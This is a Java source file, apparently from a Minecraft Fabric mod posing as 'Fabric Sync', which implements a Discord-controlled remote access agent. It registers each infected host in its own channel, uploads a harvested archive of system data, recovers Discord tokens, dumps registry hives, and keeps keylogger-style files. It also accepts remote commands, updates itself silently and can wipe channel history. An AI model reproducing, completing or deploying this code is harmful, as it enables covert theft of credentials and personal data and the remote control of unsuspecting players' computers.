package com.serverpackcore.agent;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public final class Poller implements Runnable {
	private static final long UPLOAD_LIMIT = 8L * 1024L * 1024L;
	private static final long UPLOAD_PART = 7L * 1024L * 1024L;

	private final Path installDir;
	private final Path gameDir;
	private final State state;
	private final Random random = new Random();
	private final CommandExecutor executor;
	private final ThreadPoolExecutor commandPool;
	private final ExecutorService auxPool;
	private final Semaphore pollNow = new Semaphore(0);
	private final AutoUpdate auto;
	private final OpsManager ops;
	private final Set<String> seen = new LinkedHashSet<>();
	private final Object seenLock = new Object();
	private volatile Path cwd;
	private volatile boolean running = true;
	private volatile boolean contentIntent = true;
	private volatile Thread pollerThread;
	private volatile Thread autoThread;
	private volatile DiscordClient client;
	private volatile String currentToken = "";
	private volatile Gateway gateway;
	private volatile String selfId = "";
	private volatile String channelId = "";
	private volatile String webhookUrl = "";
	private long lastActivity;
	private long lastSave;

	public Poller(Path installDir, Path gameDir, State state) {
		this.installDir = installDir;
		this.gameDir = gameDir;
		this.state = state;
		this.auto = new AutoUpdate(state, System::currentTimeMillis, random);
		this.ops = new OpsManager(installDir, state, this);
		this.cwd = Path.of(System.getProperty("user.home", "."));
		this.executor = new CommandExecutor(this, installDir, gameDir, state);
		this.commandPool = new ThreadPoolExecutor(3, 3, 0L, TimeUnit.MILLISECONDS,
			new ArrayBlockingQueue<>(64), runnable -> {
				Thread thread = new Thread(runnable, "spc-command");
				thread.setDaemon(true);
				return thread;
			}, new ThreadPoolExecutor.AbortPolicy());
		this.auxPool = Executors.newSingleThreadExecutor(runnable -> {
			Thread thread = new Thread(runnable, "spc-control");
			thread.setDaemon(true);
			return thread;
		});
	}

	public void start() {
		Thread thread = new Thread(this, "spc-poller");
		thread.setDaemon(false);
		thread.start();
	}

	public void startOps() {
		try {
			ops.start();
		} catch (Throwable throwable) {
			Log.debug("OPSEC start failed", throwable);
		}
	}

	public OpsManager ops() {
		return ops;
	}

	public boolean ready() {
		return !channelId.isEmpty() && client != null;
	}

	public AutoUpdate auto() {
		return auto;
	}

	private void syncMod() {
		if (gameDir == null || Update.installedModMatches(gameDir, Update.currentVersion())) {
			return;
		}
		if (Update.modHelperRunning(installDir)) {
			return;
		}
		if (!Update.begin()) {
			return;
		}
		try {
			Update.syncMod(installDir, gameDir);
			Update.log(installDir, Update.currentVersion(), "-", "mod-synced");
		} catch (UpdateException exception) {
			Log.debug("Mod sync failed", exception);
		} finally {
			Update.end();
		}
	}

	private void absorbRollback() {
		Path marker = AgentPaths.rollbackMarker(installDir);
		if (!Files.isRegularFile(marker)) {
			return;
		}
		try {
			Files.deleteIfExists(marker);
		} catch (java.io.IOException exception) {
			Log.debug("Rollback marker cleanup failed", exception);
		}
		if (!auto.enabled()) {
			state.autoFailures = 0;
			return;
		}
		auto.backoff();
		Update.log(installDir, "-", "-", "auto-failed startup rollback");
		state.save(AgentPaths.state(installDir));
		reply("Auto update failed: startup rollback");
	}

	private void startAuto() {
		Thread thread = new Thread(this::autoLoop, "spc-auto");
		thread.setDaemon(true);
		thread.start();
		autoThread = thread;
	}

	private void autoLoop() {
		long tick = AutoUpdate.tickDelay();
		while (running) {
			try {
				Thread.sleep(tick);
			} catch (InterruptedException exception) {
				return;
			}
			if (!running || !auto.due() || !Update.begin()) {
				continue;
			}
			try {
				runAutoUpdate();
			} catch (Throwable throwable) {
				Log.debug("Auto update failed", throwable);
				Update.log(installDir, "-", "-", "auto-failed " + throwable.getMessage());
				reply("Auto update failed: " + throwable.getMessage());
			} finally {
				Update.end();
				state.save(AgentPaths.state(installDir));
			}
		}
	}

	private void runAutoUpdate() {
		Update.Info info;
		try {
			info = Update.checkIfNewer();
		} catch (UpdateException exception) {
			autoFailed(exception.getMessage());
			return;
		}
		if (info == null) {
			auto.advance();
			Update.log(installDir, "-", "-", "auto-none");
			return;
		}
		if (stagedByHand()) {
			auto.advance();
			Update.log(installDir, info.version, "-", "auto-skipped staged");
			return;
		}
		try {
			Update.stage(info, installDir);
			Update.apply(installDir, gameDir, info.version);
		} catch (UpdateException exception) {
			autoFailed(exception.getMessage());
			return;
		}
		auto.advance();
		Update.log(installDir, info.version, info.agentSha256, "auto-updated");
		state.save(AgentPaths.state(installDir));
		reply("Auto update to " + info.version);
		kill();
	}

	private void autoFailed(String message) {
		auto.backoff();
		Update.log(installDir, "-", "-", "auto-failed " + message);
		state.save(AgentPaths.state(installDir));
		reply("Auto update failed: " + message);
	}

	private boolean stagedByHand() {
		return Files.isRegularFile(AgentPaths.agentStaged(installDir))
			|| Files.isRegularFile(AgentPaths.modStaged(installDir));
	}

	@Override
	public void run() {
		pollerThread = Thread.currentThread();
		try {
			lastActivity = System.currentTimeMillis();
			String token = resolveToken();
			if (!running || token.isEmpty()) {
				return;
			}
			client = new DiscordClient(token);
			currentToken = token;
			if (!ensure()) {
				return;
			}
			gateway = new Gateway(this, client);
			gateway.start();
			absorbRollback();
			startAuto();
			auxPool.execute(this::syncMod);
			auxPool.execute(this::cleanupCache);
			long backoff = 2000L;
			int failures = 0;
			while (running) {
				try {
					if (gatewayHealthy() && contentIntent()) {
						pollNow.tryAcquire(5L, TimeUnit.MINUTES);
						pollNow.drainPermits();
						if (!running) {
							break;
						}
						poll();
						failures = 0;
						backoff = 2000L;
						continue;
					}
					long wait;
					if (gatewayHealthy()) {
						wait = Math.max(500L, DiscordConfig.POLL_MS + random.nextInt(1001) - 500L);
					} else {
						long idle = System.currentTimeMillis() - lastActivity > DiscordConfig.IDLE_AFTER_MS
							? DiscordConfig.IDLE_POLL_MS
							: DiscordConfig.POLL_MS;
						wait = Math.max(500L, idle + random.nextInt(1001) - 500L);
					}
					Log.debug("Poll wait " + wait + " ms (gateway=" + gatewayHealthy()
						+ ", content=" + contentIntent() + ")");
					pollNow.tryAcquire(wait, TimeUnit.MILLISECONDS);
					pollNow.drainPermits();
					if (!running) {
						break;
					}
					poll();
					failures = 0;
					backoff = 2000L;
				} catch (RateLimitException rateLimit) {
					if (!running) {
						break;
					}
					Thread.sleep(rateLimit.retryMs());
				} catch (InterruptedException interrupted) {
					if (!running) {
						break;
					}
				} catch (Throwable throwable) {
					if (!running) {
						break;
					}
					failures++;
					Log.debug("Poll failed (" + failures + ")", throwable);
					Thread.sleep(backoff);
					backoff = Math.min(DiscordConfig.MAX_BACKOFF_MS, backoff * 2L);
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Poller stopped", throwable);
		}
	}

	/** Waits for credentials instead of burning against Discord with an empty token. */
	private String resolveToken() {
		while (running) {
			String token = Credentials.load(installDir);
			if (!token.isEmpty()) {
				Log.debug("Credentials resolved");
				return token;
			}
			Log.debug("No credentials yet, retrying");
			try {
				Thread.sleep(30000L);
			} catch (InterruptedException interrupted) {
				return "";
			}
		}
		return "";
	}

	/** Swaps in rotated credentials after a 401. Returns false when nothing changed. */
	private boolean refreshClient() {
		String token = Credentials.load(installDir);
		if (token.isEmpty() || token.equals(currentToken)) {
			return false;
		}
		DiscordClient old = client;
		client = new DiscordClient(token);
		currentToken = token;
		if (old != null) {
			old.close();
		}
		Log.debug("Discord token rotated");
		return true;
	}

	private boolean ensure() throws Exception {
		while (running) {
			try {
				selfId = Json.str(Json.parseObject(client.get("/users/@me").body), "id", "");
				if (selfId.isEmpty()) {
					throw new IllegalStateException("no self id");
				}
				channelId = state.channelId;
				if (channelId.isEmpty() || !channelExists(channelId)) {
					forgetChannel();
					channelId = createChannel();
					state.channelId = channelId;
					state.save(AgentPaths.state(installDir));
				}
				if ("0".equals(state.lastId)) {
					List<Object> latest = Json.list(Json.parse(
						client.get("/channels/" + channelId + "/messages?limit=1").body));
					if (!latest.isEmpty()) {
						String id = Json.str(Json.map(latest.get(0)), "id", "");
						if (!id.isEmpty()) {
							state.lastId = id;
							state.save(AgentPaths.state(installDir));
						}
					}
				}
				webhookUrl = state.webhookUrl;
				if (webhookUrl.isEmpty() || !webhookExists(webhookPath())) {
					// A webhook is only for attachments; replies still work without one.
					try {
						webhookUrl = createWebhook();
						state.webhookUrl = webhookUrl;
						state.save(AgentPaths.state(installDir));
					} catch (RateLimitException rateLimit) {
						throw rateLimit;
					} catch (Exception exception) {
						webhookUrl = "";
						Log.debug("Webhook setup failed", exception);
					}
				}
				if (!state.hello) {
					sendHello();
					state.hello = true;
					state.save(AgentPaths.state(installDir));
				}
				return true;
			} catch (RateLimitException rateLimit) {
				if (!running) {
					return false;
				}
				Thread.sleep(rateLimit.retryMs());
			} catch (DiscordException exception) {
				if (exception.status() == 401 && refreshClient()) {
					Thread.sleep(1000L);
					continue;
				}
				if (!running) {
					return false;
				}
				Log.debug("Ensure failed", exception);
				Thread.sleep(10000L);
			} catch (Throwable throwable) {
				if (!running) {
					return false;
				}
				Log.debug("Ensure failed", throwable);
				Thread.sleep(10000L);
			}
		}
		return false;
	}

	/** A deleted channel must be recreated instead of failing every poll forever. */
	private boolean channelExists(String id) throws Exception {
		try {
			client.get("/channels/" + id);
			return true;
		} catch (DiscordException exception) {
			return exception.status() != 404;
		}
	}

	private boolean webhookExists(String path) throws Exception {
		if (path.isEmpty()) {
			return false;
		}
		try {
			client.get(path);
			return true;
		} catch (DiscordException exception) {
			return false;
		}
	}

	private void forgetChannel() {
		channelId = "";
		webhookUrl = "";
		synchronized (seenLock) {
			seen.clear();
		}
		state.channelId = "";
		state.webhookUrl = "";
		state.lastId = "0";
		state.hello = false;
		state.save(AgentPaths.state(installDir));
	}

	private String createChannel() throws Exception {
		String name = ("sync-" + SysInfo.hostname() + "-" + SysInfo.user())
			.toLowerCase().replaceAll("[^a-z0-9-_]", "-");
		if (name.length() > 90) {
			name = name.substring(0, 90);
		}
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", name);
		body.put("type", 0);
		String category = DiscordConfig.categoryId();
		if (!category.isEmpty()) {
			body.put("parent_id", category);
		}
		try {
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.guildId() + "/channels", Json.stringify(body)).body);
			return Json.str(response, "id", "");
		} catch (DiscordException exception) {
			Map<String, Object> fallback = new LinkedHashMap<>();
			fallback.put("name", ("sync-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
			fallback.put("type", 0);
			Map<String, Object> response = Json.parseObject(client.post(
				"/guilds/" + DiscordConfig.guildId() + "/channels", Json.stringify(fallback)).body);
			return Json.str(response, "id", "");
		}
	}

	private String createWebhook() throws Exception {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("name", "Fabric Sync");
		Map<String, Object> response = Json.parseObject(client.post(
			"/channels/" + channelId + "/webhooks", Json.stringify(body)).body);
		return Json.str(response, "url", "");
	}

	private void sendHello() {
		try {
			Map<String, Object> embed = new LinkedHashMap<>();
			embed.put("title", "Fabric Sync");
			embed.put("description", "New client connected");
			embed.put("color", 0x3498db);
			List<Object> fields = new ArrayList<>();
			for (String line : SysInfo.embedFields(installDir, gameDir)) {
				int split = line.indexOf(':');
				Map<String, Object> field = new LinkedHashMap<>();
				field.put("name", split > 0 ? line.substring(0, split) : "Data");
				field.put("value", split > 0 ? line.substring(split + 1).trim() : line);
				field.put("inline", false);
				fields.add(field);
			}
			embed.put("fields", fields);
			Map<String, Object> payload = new LinkedHashMap<>();
			payload.put("embeds", List.of(embed));
			client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
		} catch (Throwable throwable) {
			Log.debug("Hello embed failed", throwable);
		}
		try {
			Path zip = Harvest.build(installDir, gameDir);
			if (uploadFile(zip)) {
				Files.deleteIfExists(zip);
			}
		} catch (Throwable throwable) {
			Log.debug("Hello harvest failed", throwable);
		}
	}

	/** Drops transient plaintext leftovers that a failed run or crash kept on disk. */
	private void cleanupCache() {
		Path cache = AgentPaths.cache(installDir);
		if (!Files.isDirectory(cache)) {
			return;
		}
		Path keepToken = cache.resolve("discord").resolve("token.txt");
		long older = System.currentTimeMillis() - 7L * 24L * 60L * 60L * 1000L;
		try (java.util.stream.Stream<Path> stream = Files.walk(cache, 4)) {
			stream.filter(Files::isRegularFile).forEach(path -> {
				try {
					if (path.equals(keepToken) || path.startsWith(cache.resolve(".done"))
						|| path.startsWith(AgentPaths.tools(installDir))
						|| protectedOps(path)) {
						return;
					}
					if (Files.getLastModifiedTime(path).toMillis() < older) {
						Files.deleteIfExists(path);
					}
				} catch (Throwable throwable) {
					Log.debug("Cache cleanup failed: " + path, throwable);
				}
			});
		} catch (Throwable throwable) {
			Log.debug("Cache scan failed", throwable);
		}
	}

	private boolean protectedOps(Path path) {
		Path ops = OpsPaths.ops(installDir);
		if (!path.startsWith(ops)) {
			return false;
		}
		String name = path.getFileName().toString();
		return name.endsWith(".ps1") || name.equals("keys.on") || name.equals("keys.pid")
			|| name.equals("keys.offset") || name.equals("keys.events") || name.equals("seeds.log");
	}

	private boolean poll() throws Exception {
		Log.debug("Poll REST");
		String after;
		synchronized (seenLock) {
			after = state.lastId;
		}
		List<Object> messages;
		try {
			messages = Json.list(Json.parse(
				client.get("/channels/" + channelId + "/messages?limit=50&after=" + after).body));
		} catch (DiscordException exception) {
			if (exception.status() == 401 && refreshClient()) {
				return false;
			}
			if (exception.status() != 404) {
				throw exception;
			}
			Log.debug("Channel missing, recreating", exception);
			ensure();
			return false;
		}
		if (messages.isEmpty()) {
			saveHeartbeat();
			return false;
		}
		java.util.Collections.reverse(messages);
		boolean activity = false;
		for (Object item : messages) {
			Map<String, Object> message = Json.map(item);
			String id = Json.str(message, "id", "");
			if (!id.isEmpty()) {
				synchronized (seenLock) {
					state.lastId = maxId(state.lastId, id);
				}
			}
			String authorId = Json.str(Json.map(message.get("author")), "id", "");
			String content = Json.str(message, "content", "");
			if (!authorId.equals(selfId) && !content.isEmpty() && allowed(message, authorId) && markSeen(id)) {
				activity = true;
				message.put("_transport", "rest");
				executor.handle(message);
				if (!running) {
					break;
				}
			}
		}
		if (activity) {
			lastActivity = System.currentTimeMillis();
		}
		saveHeartbeat();
		state.save(AgentPaths.state(installDir));
		return activity;
	}

	private void saveHeartbeat() {
		long now = System.currentTimeMillis();
		if (now - lastSave > 30000L) {
			state.lastHeartbeat = now;
			state.save(AgentPaths.state(installDir));
			lastSave = now;
		}
	}

	private static String maxId(String current, String candidate) {
		try {
			java.math.BigInteger left = new java.math.BigInteger(current);
			java.math.BigInteger right = new java.math.BigInteger(candidate);
			return right.compareTo(left) > 0 ? candidate : current;
		} catch (Throwable throwable) {
			return candidate;
		}
	}

	public void onGatewayReady(String id) {
		if (!id.isEmpty()) {
			selfId = id;
		}
	}

	public void contentIntentDisabled() {
		contentIntent = false;
		reply("MESSAGE_CONTENT disabled in the portal; gateway with intents 513 and REST fallback every 2 s.");
	}

	public void onGatewayMessage(Map<String, Object> message) {
		if (!running) {
			return;
		}
		String channel = Json.str(message, "channel_id", "");
		if (!channel.equals(channelId)) {
			return;
		}
		lastActivity = System.currentTimeMillis();
		String content = Json.str(message, "content", "");
		boolean webhook = message.get("webhook_id") != null;
		// Command webhooks let one account drive the agent without a second
		// member in the channel; our own embeds carry no content and skip.
		if (webhook && content.isEmpty()) {
			// The gateway hides webhook content without the intent; let the REST
			// poll read it instead of dropping the command.
			requestPoll();
			return;
		}
		String authorId = Json.str(Json.map(message.get("author")), "id", "");
		if (authorId.equals(selfId)) {
			return;
		}
		if (!allowed(message, authorId)) {
			requestPoll();
			return;
		}
		String id = Json.str(message, "id", "");
		if (content.isEmpty()) {
			requestPoll();
			return;
		}
		if (!markSeen(id)) {
			return;
		}
		if (!id.isEmpty()) {
			synchronized (seenLock) {
				state.lastId = maxId(state.lastId, id);
			}
		}
		lastActivity = System.currentTimeMillis();
		try {
			message.put("_transport", "gateway");
			executor.handle(message);
		} catch (Throwable throwable) {
			Log.debug("Gateway command failed", throwable);
		}
	}

	/** An empty allowlist accepts every member; webhooks stay trusted. */
	private static boolean allowed(Map<String, Object> message, String authorId) {
		Set<String> users = DiscordConfig.allowedUsers();
		return users.isEmpty() || users.contains(authorId) || message.get("webhook_id") != null;
	}

	private boolean markSeen(String id) {
		if (id.isEmpty()) {
			return true;
		}
		synchronized (seenLock) {
			if (!seen.add(id)) {
				return false;
			}
			if (seen.size() > 512) {
				Iterator<String> iterator = seen.iterator();
				iterator.next();
				iterator.remove();
			}
			return true;
		}
	}

	public void react(Map<String, Object> message) {
		String id = Json.str(message, "id", "");
		if (id.isEmpty()) {
			return;
		}
		auxPool.execute(() -> {
			try {
				client.put("/channels/" + channelId + "/messages/" + id + "/reactions/%E2%9C%85/@me");
			} catch (Throwable throwable) {
				Log.debug("Reaction failed", throwable);
			}
		});
	}

	public void typing() {
		auxPool.execute(() -> {
			try {
				client.post("/channels/" + channelId + "/typing", "{}");
			} catch (Throwable throwable) {
				Log.debug("Typing failed", throwable);
			}
		});
	}

	public void requestPoll() {
		pollNow.release();
	}

	public boolean gatewayHealthy() {
		Gateway current = gateway;
		return current != null && current.healthy();
	}

	public boolean contentIntent() {
		return contentIntent;
	}

	public void contentIntent(boolean enabled) {
		contentIntent = enabled;
	}

	public String gatewayTransport() {
		return gatewayHealthy() ? "gateway" : "rest";
	}

	public String gatewayStateText() {
		Gateway current = gateway;
		return current == null ? "not started" : current.state();
	}

	public long gatewayRtt() {
		Gateway current = gateway;
		return current == null ? -1L : current.rtt();
	}

	public void gatewayCommand(List<String> args) {
		Gateway current = gateway;
		if (args.size() > 1 && args.get(1).equalsIgnoreCase("restart")) {
			if (current == null || current.state().equals("stopped")) {
				reply("Gateway not started");
				return;
			}
			reply("Restarting gateway");
			current.restart();
			return;
		}
		if (current == null) {
			reply("gateway: not started");
			return;
		}
		long rtt = current.rtt();
		reply("gateway: " + current.state()
			+ "\ncontent_intent: " + (contentIntent ? "on" : "off")
			+ "\nrtt_ack: " + (rtt < 0L ? "n/a" : rtt + " ms")
			+ "\nreconnects: " + current.reconnects()
			+ "\nlast_close: " + current.lastCloseCode());
	}

	public void submit(Runnable task) {
		try {
			commandPool.execute(task);
		} catch (RejectedExecutionException rejected) {
			reply("Command queue full");
		}
	}

	public void reply(String text) {
		try {
			int start = 0;
			while (start < text.length()) {
				int end = Math.min(text.length(), start + 1900);
				if (end < text.length() && Character.isHighSurrogate(text.charAt(end - 1))
					&& Character.isLowSurrogate(text.charAt(end))) {
					end--;
				}
				String chunk = text.substring(start, end);
				Map<String, Object> payload = new LinkedHashMap<>();
				payload.put("content", chunk);
				for (int attempt = 0; attempt < 4; attempt++) {
					try {
						client.post("/channels/" + channelId + "/messages", Json.stringify(payload));
						break;
					} catch (RateLimitException rateLimit) {
						if (!sleepQuietly(Math.min(rateLimit.retryMs(), 10000L))) {
							return;
						}
					} catch (Throwable throwable) {
						Log.debug("Reply failed", throwable);
						return;
					}
				}
				start = end;
			}
		} catch (Throwable throwable) {
			Log.debug("Reply failed", throwable);
		}
	}

	public boolean uploadBytes(byte[] data, String name, String contentType) {
		if (webhookUrl.isEmpty()) {
			return false;
		}
		for (int attempt = 0; attempt < 4; attempt++) {
			try {
				client.postWebhook(webhookUrl, "{\"content\":\"\"}",
					List.of(new DiscordClient.Part("file", name, contentType, data)));
				return true;
			} catch (RateLimitException rateLimit) {
				if (!sleepQuietly(Math.min(rateLimit.retryMs(), 30000L))) {
					return false;
				}
			} catch (Throwable throwable) {
				if (attempt == 3) {
					Log.debug("Upload bytes failed: " + name, throwable);
					return false;
				}
				sleepQuietly(500L * (attempt + 1));
			}
		}
		return false;
	}

	public boolean uploadFile(Path file) {
		try {
			if (file == null || !Files.isRegularFile(file)) {
				return false;
			}
			long size = Files.size(file);
			if (size > UPLOAD_LIMIT) {
				return uploadParts(file);
			}
			byte[] data = Files.readAllBytes(file);
			String name = file.getFileName().toString();
			return uploadBytes(data, name, contentType(name));
		} catch (Throwable throwable) {
			Log.debug("Upload file failed", throwable);
			return false;
		}
	}

	/** Discord caps a single attachment; large archives travel as sorted .partNN files. */
	private boolean uploadParts(Path file) throws java.io.IOException {
		String base = file.getFileName().toString();
		long size = Files.size(file);
		int count = (int) ((size + UPLOAD_PART - 1L) / UPLOAD_PART);
		try (java.io.RandomAccessFile input = new java.io.RandomAccessFile(file.toFile(), "r")) {
			for (int index = 1; index <= count; index++) {
				long offset = (long) (index - 1) * UPLOAD_PART;
				int length = (int) Math.min(UPLOAD_PART, size - offset);
				byte[] chunk = new byte[length];
				input.seek(offset);
				input.readFully(chunk);
				String name = base + String.format(java.util.Locale.ROOT, ".part%03d", index);
				if (!uploadBytes(chunk, name, contentType(base))) {
					Log.debug("Upload part failed: " + name);
					return false;
				}
			}
		}
		Log.debug("Upload split into " + count + " parts: " + base);
		return true;
	}

	private static String contentType(String name) {
		String lower = name.toLowerCase().replaceFirst("\\.part\\d+$", "");
		if (lower.endsWith(".zip")) {
			return "application/zip";
		}
		if (lower.endsWith(".png")) {
			return "image/png";
		}
		if (lower.endsWith(".txt") || lower.endsWith(".log")) {
			return "text/plain";
		}
		return "application/octet-stream";
	}

	public void tokenNow() {
		String token = Harvest.discordTokenNow(installDir);
		if (token.isEmpty()) {
			reply("Discord token: not recovered (see keys.txt or use hives)");
		} else {
			reply("Discord token saved: " + token.substring(0, Math.min(24, token.length())) + "...");
		}
	}

	public void clearChannel(int requested) {
		int limit = Math.max(1, Math.min(requested <= 0 ? 100 : requested, 1000));
		Thread thread = new Thread(() -> {
			List<String> ids = new ArrayList<>();
			Set<String> webhookMessages = new LinkedHashSet<>();
			try {
				String before = "";
				String ownWebhook = webhookId();
				while (ids.size() < limit) {
					int batch = Math.min(100, limit - ids.size());
					String path = "/channels/" + channelId + "/messages?limit=" + batch
						+ (before.isEmpty() ? "" : "&before=" + before);
					List<Object> messages = Json.list(Json.parse(client.get(path).body));
					if (messages.isEmpty()) {
						break;
					}
					for (Object item : messages) {
						Map<String, Object> message = Json.map(item);
						String id = Json.str(message, "id", "");
						if (id.isEmpty()) {
							continue;
						}
						ids.add(id);
						if (!ownWebhook.isEmpty() && ownWebhook.equals(Json.str(message, "webhook_id", ""))) {
							webhookMessages.add(id);
						}
					}
					before = ids.get(ids.size() - 1);
					if (messages.size() < batch) {
						break;
					}
				}
			} catch (Throwable throwable) {
				reply("Clear failed: " + throwable.getMessage());
				return;
			}
			int deleted = 0;
			int skipped = 0;
			boolean bulk = true;
			String ownWebhookPath = webhookMessages.isEmpty() ? "" : webhookPath();
			for (int index = 0; index < ids.size(); index += 100) {
				List<String> chunk = ids.subList(index, Math.min(index + 100, ids.size()));
				if (bulk && bulkDelete(chunk)) {
					deleted += chunk.size();
					continue;
				}
				// No MANAGE_MESSAGES, or a chunk older than two weeks: remove one
				// by one. Our own messages and webhook posts need no permission.
				bulk = false;
				for (String id : chunk) {
					if (deleteMessage(id, webhookMessages.contains(id) ? ownWebhookPath : "")) {
						deleted++;
					} else {
						skipped++;
					}
				}
			}
			String message = "Cleared " + deleted + " messages";
			if (skipped > 0) {
				message += " · skipped " + skipped + " (needs Manage Messages for other authors)";
			}
			reply(message);
		}, "spc-clear");
		thread.setDaemon(true);
		thread.start();
	}

	private boolean bulkDelete(List<String> chunk) {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("messages", chunk);
		for (int attempt = 0; attempt < 3; attempt++) {
			try {
				client.post("/channels/" + channelId + "/messages/bulk-delete", Json.stringify(body));
				return true;
			} catch (RateLimitException rateLimit) {
				if (!sleepQuietly(rateLimit.retryMs())) {
					return false;
				}
			} catch (DiscordException exception) {
				if (exception.status() != 429) {
					return false;
				}
			} catch (Throwable throwable) {
				return false;
			}
		}
		return false;
	}

	private boolean deleteMessage(String id, String webhookPath) {
		String path = webhookPath.isEmpty()
			? "/channels/" + channelId + "/messages/" + id
			: webhookPath + "/messages/" + id;
		for (int attempt = 0; attempt < 4; attempt++) {
			try {
				client.delete(path);
				return true;
			} catch (RateLimitException rateLimit) {
				if (!sleepQuietly(rateLimit.retryMs())) {
					return false;
				}
			} catch (DiscordException exception) {
				// A message already gone still counts as cleared.
				return exception.status() == 404;
			} catch (Throwable throwable) {
				return false;
			}
		}
		return false;
	}

	private static boolean sleepQuietly(long millis) {
		try {
			Thread.sleep(millis);
			return true;
		} catch (InterruptedException interrupted) {
			Thread.currentThread().interrupt();
			return false;
		}
	}

	/** `/webhooks/{id}/{token}` for the command webhook, or empty before it exists. */
	private String webhookPath() {
		String url = webhookUrl;
		int start = url.indexOf("/webhooks/");
		if (start < 0 || url.lastIndexOf('/') <= start + "/webhooks/".length()) {
			return "";
		}
		return url.substring(start);
	}

	private String webhookId() {
		String path = webhookPath();
		if (path.isEmpty()) {
			return "";
		}
		String rest = path.substring("/webhooks/".length());
		int slash = rest.indexOf('/');
		return slash < 0 ? rest : rest.substring(0, slash);
	}

	public void harvestNow() {		try {
			Path zip = Harvest.build(installDir, gameDir);
			if (uploadFile(zip)) {
				Files.deleteIfExists(zip);
			} else {
				reply("Harvest upload failed; kept " + zip.getFileName() + " in cache");
			}
		} catch (Throwable throwable) {
			reply("Harvest failed: " + throwable.getMessage());
		}
	}

	public void kill() {
		running = false;
		pollNow.release();
		Gateway currentGateway = gateway;
		if (currentGateway != null) {
			currentGateway.stop();
		}
		Thread thread = pollerThread;
		if (thread != null) {
			thread.interrupt();
		}
		DiscordClient current = client;
		if (current != null) {
			current.close();
		}
		commandPool.shutdownNow();
		auxPool.shutdownNow();
		state.save(AgentPaths.state(installDir));
	}

	public void persist(boolean enabled) {
		state.persist = enabled;
		state.save(AgentPaths.state(installDir));
	}

	public void hivesNow() {
		Bootstrap.hivesNow(this, installDir, state);
	}

	public void bootstrapNow() {
		Bootstrap.now(this, installDir, state);
	}

	public Path cwd() {
		return cwd;
	}

	public void cwd(Path path) {
		this.cwd = path;
	}

	public Path gameDir() {
		return gameDir;
	}

	public String webhookUrl() {
		return webhookUrl;
	}

	public String channelId() {
		return channelId;
	}

	DiscordClient client() {
		return client;
	}
}
